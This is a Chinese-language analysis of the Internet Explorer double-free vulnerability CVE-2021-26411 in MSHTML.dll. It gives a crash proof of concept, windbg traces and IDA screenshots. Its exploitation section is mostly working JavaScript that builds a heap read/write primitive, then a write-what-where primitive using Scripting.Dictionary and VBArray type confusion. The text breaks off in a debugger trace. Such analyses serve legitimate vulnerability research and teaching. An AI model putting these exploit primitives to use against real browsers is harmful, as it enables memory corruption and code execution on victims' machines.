# CVE-2021-26411漏洞分析
## 漏洞信息

CVE：CVE-2021-26411

IE版本：IE 9-11

漏洞类型：Double Free

漏洞模块：MSHTML.dll

## 漏洞成因

POC：

```javascript
<script>
var elem = document.createElement('xxx'); 
var attr1 = document.createAttribute('yyy'); 
var attr2 = document.createAttribute('zzz'); 

var obj = {};
obj.valueOf = function() {
	elem.clearAttributes();
	return 0x1337;
};

attr1.nodeValue = obj;
attr2.nodeValue = 123;
elem.setAttributeNode(attr1);
elem.setAttributeNode(attr2);
elem.removeAttributeNode(attr1); 
</script>
```

在windbg中调试发现崩溃于CAttrValue::GetDISPID中，栈回溯发现漏洞发生于ie9_removeAttributeNodeInternal函数中，于是重新在此下断：

![](https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_9-44-45.png)

查看IDA反汇编代码，发现传入6个参数，而this指针是通过ECX寄存器传递的：

![](https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-2-7_17-11-9.png)

因此下断在此直接查看ecx的CElement结构，CElement+0x10处为CAttrArray所在地址，CAttrArray内存储了5个CAttrValue结构，该结构指向的正是elem、attr1 和attr2：

![](https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_10-36-25.png)

接着通过调用两次CBase::FindAAIndexNS函数获取了attr1和attr1.ValueOf在CAttrArray中的序号：

![](https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_10-56-15.png)

将获取到的CAttr[1]的序号和vtType传入GetObjectAt函数获取CAttr[1]：

![](https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_14-9-52.png)

接着调用GetIntoBSTRAt将CAttr[1].ValueOf转化为BSTR：

![](https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_14-12-14.png)

执行完后查看CAttrArray发现elem中全部被attr2覆盖，说明在GetIntoBSTRAt函数内执行了attr1的回调函数，调用了clearAttributes将elem内的Attr对象全部释放：

![](https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_12-1-37.png)

跟进调试发现GetIntoBSTRAt内调用了JavascriptDispatch::InvokeOnSelf，最终调用CElement::clearAttributes把attr1和attr2清除：

![](https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_14-17-52.png)

执行完回调函数后会接着执行CAttrArray::Destroy来释放attr1，但是此时CAttrArray数组中被attr2覆盖，执行完毕后attr2从内存中释放：

![](https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_15-20-43.png)

当执行到CBase::FindAAIndexNS时，Attr2已经被释放，获取Index时出错返回-1：

![](https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_15-23-31.png)

因此在执行下一个CAttrArray::Destroy时触发Double Free，会将-1当作Index释放CAttr[-1]的对象，获取了一个非法的对象：

![](https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_15-36-29.png)

因此，要想构造读写原语需要占用被释放后的attr2的内存空间，同时需要向elem中添加Attribute避免CBase::FindAAIndexNS获取到非法的下标。

## 漏洞利用

### 构造读写原语

构造读写原语部分EXP如下：

```
function pad0(str) {
    return ('0000' + str).slice(-4)
}

function alloc1() {
    var view = new DataView(abf)
    var str = ''
    for (var i = 4; i < abf.byteLength - 2; i += 2)
        str += '%u' + pad0(view.getUint16(i, true).toString(16))
    var result = document.createAttribute('alloc')
    result.nodeValue = unescape(str)
    return result
}

function alloc2() {
    var dic1 = new ActiveXObject('Scripting.Dictionary')
    var dic2 = new ActiveXObject('Scripting.Dictionary')
    dic2.add(0, 1)
    dic1.add(0, dic2.items())
    dic1.add(1, fake)
    dic1.add(2, arr)
    for (i = 3; i < 0x20010 / 0x10; ++i)
        dic1.add(i, 0x12341234)
    return dic1.items()
}

var god
var arr = [{}]
var fake = new ArrayBuffer(0x100)	//伪造的write-what-where读写原语
var abf = new ArrayBuffer(0x20010)	
var alloc = alloc2()				//替换ArrayBuffer的Scripting.Dictionary对象结构
var hd0 = document.createAttribute('handle')
var hd1 = document.createAttribute('handle')
var hd2
var ele = document.createElement('element')		//element对象，内有attribute回调函数和attr字符串数组
var att = document.createAttribute('attribute')
att.nodeValue = {
    valueOf: function() {
        hd1.nodeValue = (new alloc1()).nodeValue
        ele.clearAttributes()
        hd2 = hd1.cloneNode()					//执行完该语句，attr字符串已经被替换为ArrayBuffer abf
        ele.setAttribute('attribute', 1337)		//执行该语句是为了让CBase::FindAAIndexNS获取到正确的下标，导致被替换后的attr再次被释放
    }
}
ele.setAttributeNode(att)
ele.setAttribute('attr', '0'.repeat((0x20010 - 6) / 2))
ele.removeAttributeNode(att)	//执行该语句，首先会执行attribute回调函数，接着执行removeAttributeNode
hd0.nodeValue = alloc			//随后将被释放的attr替换为dic1.items
```

下断在jscript9!Js::JavascriptArrayBuffer::Create，执行完毕后查看ArrayBuffer：fake和abf的结构，获得fake和abf的内存布局：

```
0:020> bp jscript9!Js::JavascriptArrayBuffer::Create
breakpoint 0 redefined
0:020> g
Breakpoint 0 hit
eax=00000100 ebx=095b4bc0 ecx=00000100 edx=08dcc8c0 esi=05d46568 edi=05d46568
eip=737893d0 esp=05cec964 ebp=05cec980 iopl=0         nv up ei pl nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000207
jscript9!Js::JavascriptArrayBuffer::Create:	 	//var fake = new ArrayBuffer(0x100)	
737893d0 8bff            mov     edi,edi
0:009> gu
eax=0963fed0 ebx=095b4bc0 ecx=00000000 edx=00000078 esi=05d46568 edi=05d46568
eip=739b7f03 esp=05cec968 ebp=05cec980 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
jscript9!Js::ArrayBuffer::NewInstance+0xb3:
739b7f03 5f              pop     edi
0:009> dpp eax L9			//fake的ArrayBuffer结构
0963fed0  7370514c 7378ac10 jscript9!Js::JavascriptArrayBuffer::Finalize
0963fed4  08dcc8c0 00000020
0963fed8  00000000
0963fedc  00000000
0963fee0  00000000
0963fee4  00000000
0963fee8  00000000
0963feec  05d4d338 00000000	//+0x1c为Buffer所在地址
0963fef0  00000100			//+0x20为BufferLenth
0:009> g
Breakpoint 0 hit
eax=00020010 ebx=095b4bc0 ecx=00020010 edx=08dcc8c0 esi=05d46568 edi=05d46568
eip=737893d0 esp=05cec964 ebp=05cec980 iopl=0         nv up ei pl nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000203
jscript9!Js::JavascriptArrayBuffer::Create:	 //var abf = new ArrayBuffer(0x20010)
737893d0 8bff            mov     edi,edi
0:009> gu
eax=0963ff00 ebx=095b4bc0 ecx=00000000 edx=00000008 esi=05d46568 edi=05d46568
eip=739b7f03 esp=05cec968 ebp=05cec980 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
jscript9!Js::ArrayBuffer::NewInstance+0xb3:
739b7f03 5f              pop     edi
0:009> dpp eax L9	 		//abf的ArrayBuffer结构
0963ff00  7370514c 7378ac10 jscript9!Js::JavascriptArrayBuffer::Finalize
0963ff04  08dcc8c0 00000020
0963ff08  00000000
0963ff0c  00000000
0963ff10  00000000
0963ff14  00000000
0963ff18  00000000
0963ff1c  05d61fe8 00000000 //+0x1c为Buffer所在地址
0963ff20  00020010		 	//+0x20为BufferLenth
```

此时在Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b处下断，该函数为对象函数调用处，可以看到hd0，hd1和ele在内存中的布局：

```
0:009> bp Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b
0:009> g
Breakpoint 0 hit
eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//var hd0 = document.createAttribute('handle')
0:009> p
eax=0a2f9cf0 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec9b4=05cec98c
0:009> dd poi(eax+18) L10	//hd0
05387200  715961ec 00000001 00000001 00000008
05387210  00000000 00000000 0a2f9cf0 00000000
05387220  ffffffff 093b32c4 00000008 00000000
05387230  00000000 00000000 05382370 00000000
0:009> du 093b32c4 
093b32c4  "handle"
0:009> g
Breakpoint 0 hit
eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//var hd1 = document.createAttribute('handle')
0:009> p
eax=0a2f9d20 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec9b4=05cec98c
0:009> dd poi(eax+18) L10	//hd1
05387260  715961ec 00000001 00000001 00000008
05387270  00000000 00000000 0a2f9d20 00000000
05387280  ffffffff 093b31e4 00000008 00000000
05387290  00000000 00000000 05382370 00000000
0:009> du 093b31e4 
093b31e4  "handle"
0:009> g
Breakpoint 0 hit
eax=0e408092 ebx=00ebd201 ecx=72040490 edx=00040000 esi=02000002 edi=00000002
eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CDocument::Trampoline_createElement (72040490)}	//var ele = document.createElement('element')
0:009> p
eax=0a2f9d50 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec9b4=05cec98c
0:009> dd poi(eax+18) L8	//ele
05382b40  715f5670 00000001 00000001 00000008
05382b50  05378a70 00000000 0a2f9d50 00000000
0:009> dd 05378a70 L4		//CAttrArray
05378a70  00000010 00000001 0541f580 00000000
0:009> dd 0541f580 L1*4		//CAtrrValue
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0:009> du poi(05384bc0+8)
093b2fc4  "element"
```

当执行到removeAttributeNode时，ele内已经存放了attribute回调函数和attr字符串数组：

```
0:009> g
Breakpoint 0 hit
eax=0e409f2c ebx=00ebd201 ecx=7204f960 edx=00001000 esi=10000002 edi=00000002
eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CElement::Trampoline_removeAttributeNode (7204f960)}	//ele.removeAttributeNode(att)
0:009> dd 05382b40 L8
05382b40  715f5670 00000001 00000001 00000010
05382b50  05378a70 00000000 0a2f9d50 00000000
0:009> dd 05378a70 L4
05378a70  00000010 00000004 0541f580 08954440
0:009> dd 0541f580 L4*4
0541f580  80000d04 8001141f 05384bc0 05cec4dc	//elemengt
0541f590  80000901 002dc6c1 09649b84 00000020	//attribute.nodeValue
0541f5a0  80000d09 002dc6c1 053872c0 05cec824	//attribute
0541f5b0  80000801 002dc6c2 0943b5b4 00000020	//attr
0:009> du poi(053872c0+24) 
093b3284  "attribute"
0:009> dd 0943b5b4-4	//attr
0943b5b0  0002000a 00300030 00300030 00300030
0943b5c0  00300030 00300030 00300030 00300030
0943b5d0  00300030 00300030 00300030 00300030
0943b5e0  00300030 00300030 00300030 00300030
0943b5f0  00300030 00300030 00300030 00300030
0943b600  00300030 00300030 00300030 00300030
0943b610  00300030 00300030 00300030 00300030
0943b620  00300030 00300030 00300030 00300030
```

接着在执行removeAttributeNode时，会调用att的回调函数，执行函数alloc1()，将ArrayBuffer：abf复制到hd1.nodeValue：

```
0:009> g
Breakpoint 0 hit
eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
eip=73869e6b esp=05cec068 ebp=05cec0d0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec0b8={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//var result = document.createAttribute('alloc')
0:009> g
Breakpoint 0 hit
eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
eip=73869e6b esp=05cebfc0 ebp=05cec024 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec00c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)}	//result.nodeValue = unescape(str)
0:009> g
Breakpoint 0 hit
eax=0e40dd64 ebx=00ebd201 ecx=7206eb20 edx=40000010 esi=02000001 edi=00000001
eip=73869e6b esp=05cec1d8 ebp=05cec23c iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec224={MSHTML!CFastDOM::CNode::Trampoline_Get_nodeValue (7206eb20)}
0:009> g
Breakpoint 0 hit
eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
eip=73869e6b esp=05cec230 ebp=05cec294 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec27c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)}	//hd1.nodeValue = (new alloc1()).nodeValue
0:009> dd 05387260 L10	//hd1，此时hd1.nodeValue还未赋值
05387260  715961ec 00000001 00000001 00000008
05387270  00000000 00000000 0a2f9d20 00000000
05387280  ffffffff 093b31e4 00000008 00000000
05387290  00000000 00000000 05382370 00000000
0:009> p
eax=00000000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec230 ebp=05cec294 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec268=05cec240
0:009> dd 05387260 L10	//hd1
05387260  715961ec 00000001 00000001 00000008
05387270  00000000 00000000 0a2f9d20 00000000
05387280  ffffffff 093b31e4 00000008 00000000
05387290  094a200c 00000000 05382370 00000000
0:009> dd 094a200c-4	//abf已经复制到了hd1.nodeValue
094a2008  0002000a 00000000 00000000 00000000
094a2018  00000000 00000000 00000000 00000000
094a2028  00000000 00000000 00000000 00000000
094a2038  00000000 00000000 00000000 00000000
094a2048  00000000 00000000 00000000 00000000
094a2058  00000000 00000000 00000000 00000000
094a2068  00000000 00000000 00000000 00000000
094a2078  00000000 00000000 00000000 00000000
```

执行完毕clearAttributes后，ele内的元素被清除，attr所占用的内存空间也会被清理，当执行完hd1.cloneNode()后，attr所占用的内存空间变成了hd1.nodeValue，此时获得了hd2.nodeValue这个0x20100大小的读写原语：

```
0:009> g
Breakpoint 0 hit
eax=0e407d10 ebx=00ebd201 ecx=7203e880 edx=40010004 esi=10000001 edi=00000001
eip=73869e6b esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec328={MSHTML!CFastDOM::CHTMLElement::Trampoline_clearAttributes (7203e880)}	//ele.clearAttributes()
0:009> dd 05378a70 L4
05378a70  00000010 00000004 0541f580 08954440
0:009> dd 0541f580 L4*4		//此时CAttr中的元素还未被清除
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0541f590  80000901 002dc6c1 09649b84 00000020
0541f5a0  80000d09 002dc6c1 053872c0 05cec824
0541f5b0  80000801 002dc6c2 0943b5b4 00000020
0:009> dd 0943b5b4-4		//attr所在内存也未被清除
0943b5b0  0002000a 00300030 00300030 00300030
0943b5c0  00300030 00300030 00300030 00300030
0943b5d0  00300030 00300030 00300030 00300030
0943b5e0  00300030 00300030 00300030 00300030
0943b5f0  00300030 00300030 00300030 00300030
0943b600  00300030 00300030 00300030 00300030
0943b610  00300030 00300030 00300030 00300030
0943b620  00300030 00300030 00300030 00300030
0:009> p
eax=00000000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=10000001 edi=00000001
eip=73869e6e esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec314=05cec2ec
0:009> dd 0541f580 L4*4		//执行完毕后，CAttr中的元素被清除
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0541f590  80000801 002dc6c2 0943b5b4 00000020
0541f5a0  80000801 002dc6c2 0943b5b4 00000020
0541f5b0  80000801 002dc6c2 0943b5b4 00000020
0:009> dd 0943b5b4-4		//attr所在内存也被清理，为空闲状态
0943b5b0  09461fd8 093ff588 00300030 00300030
0943b5c0  00300030 00300030 00300030 00300030
0943b5d0  00300030 00300030 00300030 00300030
0943b5e0  00300030 00300030 00300030 00300030
0943b5f0  00300030 00300030 00300030 00300030
0943b600  00300030 00300030 00300030 00300030
0943b610  00300030 00300030 00300030 00300030
0943b620  00300030 00300030 00300030 00300030
0:009> g
Breakpoint 0 hit
eax=0e413ed6 ebx=00ebd201 ecx=7209f6b0 edx=00400040 esi=02000001 edi=00000001
eip=73869e6b esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec328={MSHTML!CFastDOM::CNode::Trampoline_cloneNode (7209f6b0)}	//hd2 = hd1.cloneNode()
0:009> p
eax=0c565000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000001 edi=00000001
eip=73869e6e esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec314=05cec2ec
0:009> dd 0943b5b4-4		//attr所占用的内存空间变成了hd1.nodeValue
0943b5b0  0002000a 00000000 00000000 00000000
0943b5c0  00000000 00000000 00000000 00000000
0943b5d0  00000000 00000000 00000000 00000000
0943b5e0  00000000 00000000 00000000 00000000
0943b5f0  00000000 00000000 00000000 00000000
0943b600  00000000 00000000 00000000 00000000
0943b610  00000000 00000000 00000000 00000000
0943b620  00000000 00000000 00000000 00000000
```

然而如果直接返回到removeAttributeNode，当获取Index时就会发生报错，为了避免这种情况添加了attribute到ele中，这样就能成功获取到序号，执行CAttrArray::Destroy将attr所占用的内存空间释放：

```
0:009> g
Breakpoint 0 hit
eax=0e30d7e0 ebx=00ebd201 ecx=7186bf00 edx=00000001 esi=10000003 edi=00000003
eip=73869e6b esp=05cec2d0 ebp=05cec338 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec320={MSHTML!CFastDOM::CElement::Trampoline_setAttribute (7186bf00)}	//ele.setAttribute('attribute', 1337)
0:009> dd 0541f580 L4*4
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0541f590  80000801 002dc6c2 0943b5b4 00000020
0541f5a0  80000801 002dc6c2 0943b5b4 00000020
0541f5b0  80000801 002dc6c2 0943b5b4 00000020
0:009> dd 0943b5b4-4
0943b5b0  0002000a 00000000 00000000 00000000
0943b5c0  00000000 00000000 00000000 00000000
0943b5d0  00000000 00000000 00000000 00000000
0943b5e0  00000000 00000000 00000000 00000000
0943b5f0  00000000 00000000 00000000 00000000
0943b600  00000000 00000000 00000000 00000000
0943b610  00000000 00000000 00000000 00000000
0943b620  00000000 00000000 00000000 00000000
0:009> g
Breakpoint 0 hit
eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
eip=73869e6b esp=05cec8d0 ebp=05cec934 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec91c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)}
0:009> dd 0541f580 L4*4		//执行完毕整个removeAttributeNode函数后，ele内有两个元素，attr所占内存也被再次释放
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0541f590  80000801 002dc6c1 0945bcbc 08d069d0
0541f5a0  80000801 002dc6c2 0943b5b4 00000020
0541f5b0  80000801 002dc6c2 0943b5b4 00000020
0:009> dd 0943b5b4-4		//hd2.nodeValue
0943b5b0  09461fd8 093ff588 00000000 00000000
0943b5c0  00000000 00000000 00000000 00000000
0943b5d0  00000000 00000000 00000000 00000000
0943b5e0  00000000 00000000 00000000 00000000
0943b5f0  00000000 00000000 00000000 00000000
0943b600  00000000 00000000 00000000 00000000
0943b610  00000000 00000000 00000000 00000000
0943b620  00000000 00000000 00000000 00000000
```

读写原语hd2.nodeValue构造完毕，接下来通过hd2.nodeValue构造write-what-where读写原语来实现利用。

### 构造write-what-where

构造write-what-where读写原语EXP：

```javascript
function dump(nv) {
    var ab = new ArrayBuffer(0x20010)
    var view = new DataView(ab)
    for (var i = 0; i < nv.length; ++i)
        view.setUint16(i * 2 + 4, nv.charCodeAt(i), true)
    return ab
}

function Data(type, value) {
    this.type = type
    this.value = value
}

function setData(i, data) {
    var arr = new Uint32Array(abf)
    arr[i * 4] = data.type
    arr[i * 4 + 2] = data.value
}

function flush() {
    hd1.nodeValue = (new alloc1()).nodeValue
    hd2.nodeValue = 0
    hd2 = hd1.cloneNode()
}

function read(addr, size) {
    switch (size) {
        case 8:
            return god.getUint8(addr)
        case 16:
            return god.getUint16(addr, true)
        case 32:
            return god.getUint32(addr, true)
    }
}

function write(addr, value, size) {
    switch (size) {
        case 8:
            return god.setUint8(addr, value)
        case 16:
            return god.setUint16(addr, value, true)
        case 32:
            return god.setUint32(addr, value, true)
    }
}

function writeData(addr, data) {
    for (var i = 0; i < data.length; ++i)
        write(addr + i, data[i], 8)
}

function addrOf(obj) {
    arr[0] = obj
    return read(pArr, 32)
}

var leak = new Uint32Array(dump(hd2.nodeValue))
var pAbf = leak[6]		//fake
var pArr = leak[10]		//arr
var VT_I4 = 0x3
var VT_DISPATCH = 0x9
var VT_BYREF = 0x4000
var bufArr = new Array(0x10)
var fakeArr = new Uint32Array(fake)

for (var i = 0; i < 0x10; ++i) setData(i + 1, new Data(VT_BYREF | VT_I4, pAbf + i * 4))
flush()
var ref = new VBArray(hd0.nodeValue)
for (var i = 0; i < 0x10; ++i) bufArr[i] = ref.getItem(i + 1)	//bufArr[0] = fake,bufArr[1] = arr
ref = null
setData(1, new Data(VT_BYREF | VT_I4, bufArr[4]))				//fakeArray
setData(2, new Data(VT_BYREF | VT_I4, bufArr[4] + 0x04))		//fakeArray+0x4
setData(3, new Data(VT_BYREF | VT_I4, bufArr[4] + 0x1c))		//fakebuffer
flush()
ref = new VBArray(hd0.nodeValue)
var vt = ref.getItem(1)
var gc = ref.getItem(2)
var bs = ref.getItem(3)
ref = null
for (var i = 0; i < 16; ++i) fakeArr[i] = bufArr[i]
fakeArr[4] = bs + 0x40			
fakeArr[16] = vt
fakeArr[17] = gc					
fakeArr[24] = 0xffffffff			//buffersize
setData(1, new Data(VT_DISPATCH, bs))
flush()
ref = new VBArray(hd0.nodeValue)	//abf[0]
god = new DataView(ref.getItem(1))	//write-what-where读写原语
ref = null
pArr = read(read(pArr + 0x10, 32) + 0x14, 32) + 0x10
write(read(addrOf(hd0) + 0x18, 32) + 0x28, 0, 32)
```

执行hd0.nodeValue = alloc后，此时的hd2.nodeValue读写原语会被dic1.items()替换，并赋值给hd0.nodeValue：

```
0:009> g
Breakpoint 0 hit
eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
eip=73869e6b esp=05cec8d0 ebp=05cec934 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec91c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)	//hd0.nodeValue = alloc
0:009> p
eax=00000000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec8d0 ebp=05cec934 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec908=05cec8e0
0:009> dd 0943b5b4-4	//dic1.items()已经占据了hd2.nodeValue的内存空间
0943b5b0  0000200c 00000000 06ff1320 00000000
0943b5c0  00000009 00000000 0963cd44 00000000
0943b5d0  00000009 00000000 09649004 00000000
0943b5e0  00000003 00000000 12341234 00000000
0943b5f0  00000003 00000000 12341234 00000000
0943b600  00000003 00000000 12341234 00000000
0943b610  00000003 00000000 12341234 00000000
0943b620  00000003 00000000 12341234 00000000
```

随后创建hd2.nodeValue的Uint32Array leak，该数组的作用就是将fake和arr数组的内存地址泄露出来，pAbf存放的是fake，pArr存放的是arr：

```
0:009> g
Breakpoint 0 hit
eax=0e40dd64 ebx=00ebd201 ecx=7206eb20 edx=40000010 esi=02000001 edi=00000001
eip=73869e6b esp=05cec878 ebp=05cec8dc iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec8c4={MSHTML!CFastDOM::CNode::Trampoline_Get_nodeValue (7206eb20)}
0:009> p
eax=0c564010 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000001 edi=00000001
eip=73869e6e esp=05cec878 ebp=05cec8dc iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec8b0=05cec888
